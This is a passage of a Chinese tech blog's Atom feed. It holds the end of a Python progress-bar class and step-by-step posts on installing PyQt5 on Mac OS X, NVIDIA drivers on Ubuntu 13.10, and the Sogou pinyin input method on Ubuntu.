class="comment">#</span></div><div class="line">        <span class="comment"># Make sure I don't try to go off the end (e.g. &gt;100%)</span></div><div class="line">        <span class="comment">#</span></div><div class="line">        count=min(count, self.finalcount)</div><div class="line">        <span class="comment">#</span></div><div class="line">        <span class="comment"># If finalcount is zero, I'm done</span></div><div class="line">        <span class="comment">#</span></div><div class="line">        <span class="keyword">if</span> self.finalcount:</div><div class="line">            percentcomplete=int(round(<span class="number">100</span>*count/self.finalcount))</div><div class="line">            <span class="keyword">if</span> percentcomplete &lt; <span class="number">1</span>: percentcomplete=<span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            percentcomplete=<span class="number">100</span></div><div class="line">            </div><div class="line">        <span class="comment">#print "percentcomplete=",percentcomplete</span></div><div class="line">        blockcount=int(percentcomplete/<span class="number">2</span>)</div><div class="line">        <span class="comment">#print "blockcount=",blockcount</span></div><div class="line">        <span class="keyword">if</span> blockcount &gt; self.blockcount:</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(self.blockcount,blockcount):</div><div class="line">                self.f.write(self.block)</div><div class="line">                self.f.flush()</div><div class="line">                </div><div class="line">        <span class="keyword">if</span> percentcomplete == <span class="number">100</span>: self.f.write(<span class="string">"\n"</span>)</div><div class="line">        self.blockcount=blockcount</div><div class="line">        <span class="keyword">return</span></div><div class="line">    </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    <span class="keyword">from</span> time <span class="keyword">import</span> sleep</div><div class="line">    pb=progressbarClass(<span class="number">8</span>,<span class="string">"*"</span>)</div><div class="line">    count=<span class="number">0</span></div><div class="line">    <span class="keyword">while</span> count&lt;<span class="number">9</span>:</div><div class="line">        count+=<span class="number">1</span></div><div class="line">        pb.progress(count)</div><div class="line">        sleep(<span class="number">0.2</span>)</div></pre></td></tr></table></figure>

<p>效果如下:<br><img src="http://letitbe.u.qiniudn.com/QQ20131221-1.png" alt="效果"></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>在Python写命令行程序中,常会用到进度条,比如下载的进度条,爬虫的进度条…然而对于一些常用的python界面库,都是有进度条组件.比如<code>pyqt</code>,<code>Tkinter</code>,<code>GTK</code>。<br>python有丰富的lib可以完成各种功能,想要做到命令行进度条,可以用<a href="http://pypi.python.org/pypi/progressbar/" target="_blank" rel="external">progressbar</a>类，使用<code>easy_install</code>可以方便的安装这可个类库，其实就一个文件，拿过来放到文件同一个目录下面也直接可以import过来.整理了一下用python自带库和第三方库实现的办法：<br>]]>
    
    </summary>
    
      <category term="python" scheme="https://sqzr.cc/tags/python/"/>
    
      <category term="编程" scheme="https://sqzr.cc/categories/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Mac OS X 10.9 Install PyQt5]]></title>
    <link href="https://sqzr.cc//blog/2013/12/18/mac-os-x-10-dot-9-install-pyqt5/"/>
    <id>https://sqzr.cc//blog/2013/12/18/mac-os-x-10-dot-9-install-pyqt5/</id>
    <published>2013-12-18T11:10:00.000Z</published>
    <updated>2014-10-30T13:36:19.000Z</updated>
    <content type="html"><![CDATA[<p>PyQt是<code>Python</code>语言的GUI编程解决方案之一。可以用来代替Python内置的<code>Tkinter</code>。其它替代者还有<code>PyGTK</code>、<code>wxPython</code>等。与Qt一样，PyQt是一个自由软件。PyQt是PyKDE的基础。<br>PyQt的开发者是英国的“Riverbank Computing”公司。与4.5版本之前的Qt一样，它提供了GPL与商业协议两种授权方式，因此它可以免费地用于自由软件的开发。不过目前尚不提供LGPL授权方式。PyQt可以运行于Microsoft Windows、Mac OS X、Linux以及Unix的多数变种上。<br><a id="more"></a></p>
<hr>
<h2 id="安装qt">安装qt</h2>
<p>从qt官网上下载:<a href="http://qt-project.org/downloads" target="_blank" rel="external">下载地址</a><br>建议下载离线版(400+M):<a href="http://download.qt-project.org/official_releases/qt/5.2/5.2.0/qt-mac-opensource-5.2.0-clang-offline.dmg" target="_blank" rel="external">Qt5.2.0 For Mac</a><br>按照官方默认的路径和配置,一直戳继续就可以正常安装  </p>
<hr>
<h2 id="安装sip">安装sip</h2>
<p>Python中使用C/C++模块有许多工具，大名鼎鼎的有SWIG（英文意思为：豪饮）、SIP（英文意思为：啜饮，小口的喝），还有boost.python等。其中SIP是从SWIG发展而来，专为Python调用C/C++模块使用的,安装pyqt必须用到sip.<br>可以使用pip进行安装:  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip <span class="operator"><span class="keyword">install</span> sip</span></div></pre></td></tr></table></figure>


<p>但还是比较推荐使用官方包进行编译:  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">wget <span class="symbol">http:</span>/<span class="regexp">/sourceforge.net/projects</span><span class="regexp">/pyqt/files</span><span class="regexp">/sip/sip</span>-<span class="number">4.15</span>.<span class="number">3</span>/sip-<span class="number">4.15</span>.<span class="number">3</span>.tar.gz  </div><div class="line">tar -xzvf sip-<span class="number">4.15</span>.<span class="number">3</span>.tar.gz  </div><div class="line">cd sip-<span class="number">4.15</span>.<span class="number">3</span>  </div><div class="line">python configure.py  </div><div class="line">make  </div><div class="line">sudo make install</div></pre></td></tr></table></figure>



<hr>
<h2 id="安装pyqt">安装pyqt</h2>
<p>安装完以上两部后,进行pyqt的安装:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">wget http:<span class="comment">//sourceforge.net/projects/pyqt/files/PyQt5/PyQt-5.1.1/PyQt-gpl-5.1.1.tar.gz  </span></div><div class="line">tar -xzvf PyQt-gpl-<span class="number">5.1</span>.<span class="number">1</span>.tar.gz</div><div class="line">cd PyQt-gpl-<span class="number">5.1</span>.<span class="number">1</span>.tar.gz  </div><div class="line">-q <span class="regexp">/Users/</span>username<span class="regexp">/Qt5.2.0/</span><span class="number">5.2</span>.<span class="number">0</span><span class="regexp">/clang_64/</span>bin<span class="regexp">/qmake -d /</span>Library<span class="regexp">/Python/</span><span class="number">2.7</span><span class="regexp">/site-packages/</span> --sip <span class="regexp">/System/</span>Library<span class="regexp">/Frameworks/</span>Python.framework<span class="regexp">/Versions/</span><span class="number">2.7</span><span class="regexp">/bin/</span>sip  # 这里需要主要的是,-q 参数后面的是Qt的qmake位置,-d参数为python位置,--sip的阐述魏sip的位置,根据自己的目录自行修改</div><div class="line">make # 在mac本上编译的还是非常快</div><div class="line">sudo make</div></pre></td></tr></table></figure>

<hr>
<h2 id="安装完成,测试">安装完成,测试</h2>
<p>简单几部就完成了pyqt的安装,接下来进行测试:</p>
<figure class="highlight python"><figcaption><span>PyQt测试</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">from</span> PyQt5 <span class="keyword">import</span> QtGui</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    app = QtGui.QApplication(sys.argv)</div><div class="line">    w = QtGui.QWidget()</div><div class="line">    w.resize(<span class="number">250</span>, <span class="number">150</span>)</div><div class="line">    w.move(<span class="number">300</span>, <span class="number">300</span>)</div><div class="line">    w.setWindowTitle(<span class="string">'Simple'</span>)</div><div class="line">    w.show()</div><div class="line">	sys.exit(app.exec_())</div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>

<p>能正常输出UI,表示安装成功了</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>PyQt是<code>Python</code>语言的GUI编程解决方案之一。可以用来代替Python内置的<code>Tkinter</code>。其它替代者还有<code>PyGTK</code>、<code>wxPython</code>等。与Qt一样，PyQt是一个自由软件。PyQt是PyKDE的基础。<br>PyQt的开发者是英国的“Riverbank Computing”公司。与4.5版本之前的Qt一样，它提供了GPL与商业协议两种授权方式，因此它可以免费地用于自由软件的开发。不过目前尚不提供LGPL授权方式。PyQt可以运行于Microsoft Windows、Mac OS X、Linux以及Unix的多数变种上。<br>]]>
    
    </summary>
    
      <category term="python" scheme="https://sqzr.cc/tags/python/"/>
    
      <category term="编程" scheme="https://sqzr.cc/categories/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[总结下ubuntu 13.10 安装nvidia显卡驱动的几种办法]]></title>
    <link href="https://sqzr.cc//blog/2013/11/24/zong-jie-xia-ubuntu-13-dot-10-an-zhuang-nvidiaxian-qia-qu-dong-de-ji-chong-ban-fa/"/>
    <id>https://sqzr.cc//blog/2013/11/24/zong-jie-xia-ubuntu-13-dot-10-an-zhuang-nvidiaxian-qia-qu-dong-de-ji-chong-ban-fa/</id>
    <published>2013-11-24T11:42:00.000Z</published>
    <updated>2014-10-30T13:28:57.000Z</updated>
    <content type="html"><![CDATA[<p>NVIDIA显卡在Linux上的支持众所皆知,非常差,即使完全安装好官方的闭源驱动,效率和性能也达不到windows那样,按照网上的说法,大约是会低20%左右.但这点消耗影响并不大.因为在Linux上并没有多少消耗显卡的软件,安装好的目的,大部分是为了让电脑温度不那么高吧.到写这文章的时间,nvidia已经发布到<code>331.20</code>版的闭源驱动了,在上一个版本上提高了很大的性能,至少我玩wow不再卡了.<br>我的环境:  </p>
<ul>
<li>Ubuntu 13.10系统 </li>
<li>NVIDIA GT540M显卡</li>
</ul>
<a id="more"></a>

<hr>
<h2 id="采用PPA方式安装(最简单,快捷)">采用PPA方式安装(最简单,快捷)</h2>
<p>这种方法的前提是要你需要<code>连接网络</code>,因为是ppa通过联网的方式进行下载并自动安装,如果没有联网,参考后面的方法进行安装.<br>PPA里面的驱动,会在官方发布新版本后的3-5天添加进去,所以无需担心版本问题,安装方式很简单,只需要执行下面的命令:  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo <span class="built_in">add</span>-apt-repository <span class="keyword">pp</span><span class="variable">a:xorg</span>-edgers/ppa</div><div class="line">sudo apt-<span class="built_in">get</span> <span class="keyword">update</span></div><div class="line">sudo apt-<span class="built_in">get</span> install nvidia-<span class="number">331</span></div></pre></td></tr></table></figure>


<p>我们通过下面的方式查看是否安装成功:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dpkg <span class="operator">-l</span> | grep nvidia</div></pre></td></tr></table></figure>

<p>如果你看到出现:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">prietary NVIDIA driver</div><div class="line">rc  nvidia-<span class="number">304</span>                                <span class="number">304.116</span>-<span class="number">0</span>ubuntu1~xedgers~saucy1                  amd64        NVIDIA <span class="keyword">binary</span> Xorg driver, kernel <span class="keyword">module</span> <span class="keyword">and</span> VDPAU library</div><div class="line">ii  nvidia-<span class="number">331</span>                                <span class="number">331.20</span>-<span class="number">0</span>ubuntu1~xedgers~saucy1                   amd64        NVIDIA <span class="keyword">binary</span> Xorg driver, kernel <span class="keyword">module</span> <span class="keyword">and</span> VDPAU library</div></pre></td></tr></table></figure>

<p>类似这样的东西,那么恭喜你,重启后你就可以正常使用NVIDIA的显卡驱动了.如果你<code>曾经安装过</code>NVIDIA显卡驱动,将上面安装步骤的第三部改为:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">sudo</span> apt-get dist-upgrade</div></pre></td></tr></table></figure>

<hr>
<h2 id="官方下载安装程序程序进行安装(比较繁琐)">官方下载安装程序程序进行安装(比较繁琐)</h2>
<p>这种安装方式会比上面那种方式更加的麻烦,当然,如果你在没有网络的环境下,可以用这个办法进行安装.<br>我使用x64版本的驱动进行演示,首先去选择好你的显卡型号,然后进行下载,按<code>Ctrl+Alt+F1</code>进入纯终端模式进行安装,按下后输入你的账号密码,执行以下命令:  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">sudo</span> service lightdm stop </div><div class="line"><span class="built_in">sudo</span> chmod a+x NVIDIA-Linux-x86_64-<span class="number">331.20</span>.run</div><div class="line"><span class="built_in">sudo</span> ./NVIDIA-Linux-x86_64-<span class="number">331.20</span>.run</div><div class="line"><span class="built_in">sudo</span> reboot</div></pre></td></tr></table></figure>


<p>然后会出现安装界面,一直确定下一步就Ok了.享受最新版NVIDIA驱动吧.</p>
<hr>
<p>我个人比较推荐第一种办法,虽说必须在联网的情况下进行,但现在的电脑几乎都能联网,而且显卡驱动也不是天天都需要安装的.最后还是希望各大软件硬件厂商,能支持Linux..毕竟是个很优秀的系统.</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>NVIDIA显卡在Linux上的支持众所皆知,非常差,即使完全安装好官方的闭源驱动,效率和性能也达不到windows那样,按照网上的说法,大约是会低20%左右.但这点消耗影响并不大.因为在Linux上并没有多少消耗显卡的软件,安装好的目的,大部分是为了让电脑温度不那么高吧.到写这文章的时间,nvidia已经发布到<code>331.20</code>版的闭源驱动了,在上一个版本上提高了很大的性能,至少我玩wow不再卡了.<br>我的环境:  </p>
<ul>
<li>Ubuntu 13.10系统 </li>
<li>NVIDIA GT540M显卡</li>
</ul>
]]>
    
    </summary>
    
      <category term="linux" scheme="https://sqzr.cc/tags/linux/"/>
    
      <category term="渗透" scheme="https://sqzr.cc/categories/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Ubuntu 搜狗输入法的安装]]></title>
    <link href="https://sqzr.cc//blog/2013/11/16/ubuntu-sou-gou-shu-ru-fa-de-an-zhuang/"/>
    <id>https://sqzr.cc//blog/2013/11/16/ubuntu-sou-gou-shu-ru-fa-de-an-zhuang/</id>
    <published>2013-11-15T18:56:00.000Z</published>
    <updated>2014-10-30T13:27:51.000Z</updated>
    <content type="html"><![CDATA[<p>搜狗拼音输入法是2006年6月由搜狐（SOHU）公司推出的一款<code>Windows</code>平台下的汉字拼音输入法。搜狗拼音输入法是基于搜索引擎技术的、特别适合网民使用的、新一代的输入法产品，用户可以通过互联网备份自己的个性化词库和配置信息。目前与深度<code>Deepin</code>合作,开发了基于<code>fcitx</code>的搜狗输入法,不论是在词库还是在用户体验上,都比较适合中国人,自己在安装的过程中遇到了不少的问题.总结下自己成功安装的办法:<br><a id="more"></a>  </p>
<p>测试环境:<code>Ubuntu 13.10 x64</code></p>
<hr>
<p>在Ubuntu13.10中如果选择中文安装,已经是自带了Fcitx的中文输入法,按照网上说的办法进行PPA安装:  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sudo apt-<span class="built_in">get</span> <span class="built_in">remove</span> ibus</div><div class="line">sudo <span class="built_in">add</span>-apt-repository <span class="keyword">pp</span><span class="variable">a:fcitx</span>-team/nightly</div><div class="line">sudo <span class="built_in">add</span>-apt-repository <span class="keyword">pp</span><span class="variable">a:fcitx</span>-team/stable</div><div class="line">sudo apt-<span class="built_in">get</span> <span class="keyword">update</span></div><div class="line">sudo apt-<span class="built_in">get</span> install fcitx fcitx-config-gtk fcitx-sunpinyin fcitx-googlepinyin fcitx-module-cloudpinyin  fcitx-sogoupinyin</div><div class="line">sudo apt-<span class="built_in">get</span> install fcitx-table-<span class="keyword">all</span></div><div class="line"><span class="keyword">im</span>-switch -<span class="keyword">s</span> fcitx -<span class="keyword">z</span> default</div></pre></td></tr></table></figure>

<p>在我测试中,这样的安装办法只适合12.x…13.10会出错(只是自己测试的结果),我大概猜想的原因是因为源里面只有x32的吧,而我装的Ubuntu x64自带的师 <code>Fcitx:amd64</code>源里面的需求<code>Fcitx:i386</code>如果卸载amd64装i386.则会出现很多问题,于是我在Deppin源找x64的搜狗输入法,总算还是找到:<a href="http://packages.linuxdeepin.com/deepin/pool/main/f/fcitx-sogoupinyin-release/fcitx-sogoupinyin_0.0.1-2_amd64.deb" target="_blank" rel="external">fcitx-sogoupinyin_0.0.1-2_amd64.deb</a><br>下载下来,进行安装:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">sudo</span> dpkg -i fcitx-sogoupinyin_0.<span class="number">0.1</span>.<span class="number">2</span>_amd64.deb</div><div class="line"><span class="built_in">sudo</span> apt-get <span class="operator">-f</span> install //中途可能会出现依赖的问题,也有可能不出现,具体看你ubuntu的版,如果出现了执行这句则会自动安装依赖的包,install后面不用加任何报名,加了f参数后则可以自动安装包</div><div class="line"><span class="built_in">sudo</span> dpkg -i fcitx-sogoupinyin_0.<span class="number">0.1</span>.<span class="number">2</span>_amd64.deb //解决好依赖问题后,继续安装,知道安装成功</div></pre></td></tr></table></figure>

<p>安装完毕,切换输入法:<br>方法一:  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-<span class="keyword">get</span> install im-<span class="keyword">switch</span></div><div class="line">im-<span class="keyword">switch</span> -s fcitx -z <span class="keyword">default</span>  <span class="comment">//使用im-switch进行切换,需要安装im-switch,不推荐这样做,因为ubuntu系统已经有自带切换输入法的工具了</span></div></pre></td></tr></table></figure>

<p>方法二: </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">系统设置 → 语言支持 → 键盘输入方式系统</div></pre></td></tr></table></figure>

<hr>
<p>这样一个简单的软件,纠结了我两小时,最后提个醒,不要一味按着别人的说明进行,那可能不适合你,要别人每一个命令都起到什么用,遇到错误自己<strong>折腾</strong>.</p>
<hr>
<p>做个备份,没准哪天<code>deepin</code>和<code>sogou</code>搞毛了,官方直接把源撤销了,免得到时候满互联网找.<br>Linux搜狗输入法x32:<a href="http://pan.baidu.com/share/link?shareid=3207178081&amp;uk=523011938" target="_blank" rel="external">百度网盘</a><br>Linux搜狗输入法x64:<a href="http://pan.baidu.com/share/link?shareid=3211465765&amp;uk=523011938" target="_blank" rel="external">百度网盘</a><br>百度网盘windows客户端,能完美在linux wine下运行,可谓神器也..  </p>
]]></content>
    <summary type="html">
    <![CDATA[<p>搜狗拼音输入法是2006年6月由搜狐（SOHU）公司推出的一款<code>Windows</code>平台下的汉字拼音输入法。搜狗拼音输入法是基于搜索引擎技术的、特别适合网民使用的、新一代的输入法产品，用户可以通过互联网备份自己的个性化词库和配置信息。目前与深度<code>Deepin</code>合作,开发了基于<code>fcitx</code>的搜狗输入法,不论是在词库还是在用户体验上,都比较适合中国人,自己在安装的过程中遇到了不少的问题.总结下自己成功安装的办法:<br>]]>
    
    </summary>
    
      <category term="linux" scheme="https://sqzr.cc/tags/linux/"/>
    
      <category term="折腾" scheme="https://sqzr.cc/categories/%E6%8A%98%E8%85%BE/"/>
    
  </entry>
  
</feed>
